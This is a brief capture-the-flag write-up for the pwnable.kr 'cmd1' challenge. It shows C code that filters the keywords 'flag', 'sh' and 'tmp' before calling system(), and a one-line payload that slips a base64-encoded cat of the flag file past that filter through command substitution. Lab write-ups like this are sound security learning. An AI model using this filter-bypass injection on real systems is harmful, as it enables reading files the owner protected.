---
title: Pwnable.kr Cmd1
date: 2022-08-20T18:47:48+02:00
tags: ['cs/security']
aliases: ['']
---

This one is easy, we get the following code:

```c 
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```

It clears the PATH environ so that we can't just run `cat` but we can simply
pass absolute paths and bypass that. It also applies some filters so that we
can't use *flag* *sh* or *tmp* in our payload. But we can just base64 encode our
payload and run base64 -d.


```
./cmd1 '$(printf "L2Jpbi9jYXQgL2hvbWUvY21kMS9mbGFn" | /usr/bin/base64 -d)'
```




